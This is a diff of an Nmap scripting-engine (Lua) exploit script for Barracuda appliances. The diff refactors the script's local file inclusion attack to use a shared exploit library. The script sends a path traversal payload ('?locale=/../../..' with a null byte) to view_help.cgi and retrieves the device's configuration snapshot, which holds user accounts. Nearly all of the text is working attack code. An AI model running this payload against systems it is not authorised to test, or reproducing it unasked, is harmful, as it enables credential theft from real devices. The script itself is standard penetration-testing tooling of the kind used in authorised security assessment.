@@ -3,6 +3,7 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
 local table = require "table"
+local exploit = require "exploit"
 
 description = [[
 Attempts to retrieve the configuration settings from a Barracuda
@@ -74,12 +75,12 @@ http://www.exploit-db.com/exploits/15130/
 --            - looped path detection
 -- 2011-06-15 - looped system info extraction
 --            - changed service portrule to "barracuda"
+-- 2017-07-24 - changed to use new exploit.lua library
 --
 
 author = "Brendan Coles"
 license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"intrusive", "exploit", "auth"}
-
 
 portrule = shortport.port_or_service (8000, "barracuda", {"tcp"})
 
@@ -87,39 +88,33 @@ action = function(host, port)
 
   local result = {}
   local paths = {"/cgi-bin/view_help.cgi", "/cgi-mod/view_help.cgi"}
-  local payload = "?locale=/../../../../../../../mail/snapshot/config.snapshot%00"
+  local payload = "?locale=/../../../../../../.."
+  local file = "/mail/snapshot/config.snapshot"
   local user_count = 0
   local config_file = ""
 
   -- Loop through vulnerable files
   stdnse.debug1("Connecting to %s:%s", host.targetname or host.ip, port.number)
+
   for _, path in ipairs(paths) do
 
     -- Retrieve file
     local data = http.get(host, port, tostring(path))
-    if data and data.status then
+    if (data and data.status) then
 
       -- Check if file exists
       stdnse.debug1("HTTP %s: %s", data.status, tostring(path))
       if tostring(data.status):match("200") then
 
         -- Attempt config file retrieval with LFI exploit
-        stdnse.debug1("Exploiting: %s", tostring(path .. payload))
-        data = http.get(host, port, tostring(path .. payload))
-        if data and data.status and tostring(data.status):match("200") and data.body and data.body ~= "" then
-
-          -- Check if the HTTP response contains a valid config file in MySQL database dump format
-          if string.match(data.body, "DROP TABLE IF EXISTS config;") and string.match(data.body, "barracuda%.css") then
-            config_file = data.body
-            break
-          end
-
-        else
-          stdnse.debug1("Failed to retrieve file: %s", tostring(path .. payload))
+        local c_payload = path .. payload
+        stdnse.debug1("Exploiting: %s", tostring(c_payload))
+        local status, lfi_success, data = exploit.lfi_check(host, port, c_payload, file, nil, nil, '%00')
+        if data and string.match(data, "DROP TABLE IF EXISTS config;") and  string.match(data, "barracuda%.css") then
+          config_file = data
+          break
         end
-
       end
-
     else
       stdnse.debug1("Failed to retrieve file: %s", tostring(path))
     end
